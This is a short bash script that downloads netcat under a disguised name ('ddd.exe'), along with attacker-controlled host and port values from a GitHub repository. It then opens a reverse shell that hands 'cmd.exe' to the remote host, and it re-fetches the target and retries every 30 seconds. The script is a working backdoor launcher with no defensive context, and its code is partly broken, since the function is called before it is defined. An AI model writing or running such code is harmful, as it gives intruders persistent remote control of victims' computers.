#!/bin/bash

ping -c 1 www.google.com > /dev/null

if [ $? -eq 0 ]; then
  echo "The internet is connected"
  
  # Download necessary files
  curl https://github.com/silencer929/algorithms/raw/master/port.txt -o port.txt
  curl https://github.com/silencer929/algorithms/raw/master/host.txt -o host.txt
  curl https://github.com/silencer929/algorithms/raw/master/nc.exe -o ddd.exe

  # Read URL and port from files
  url=$(cat host.txt)
  port=$(cat port.txt)

  # Request connection
  request
else
  echo "The internet is not connected"
  
  # Request connection
  request
fi

# Function to request connection
function request {
  ./ddd.exe $url $port -e "cmd.exe"
  
  if [ $? -eq 1 ]; then
    # Pause for 30 seconds
    sleep 30
    
    # Download necessary files again
    curl https://github.com/silencer929/algorithms/raw/master/port.txt -o port.txt
    curl https://github.com/silencer929/algorithms/raw/master/host.txt -o host.txt
    port=$(cat port.txt)
    url=$(cat host.txt)
    
    # Retry request
    request
  fi
}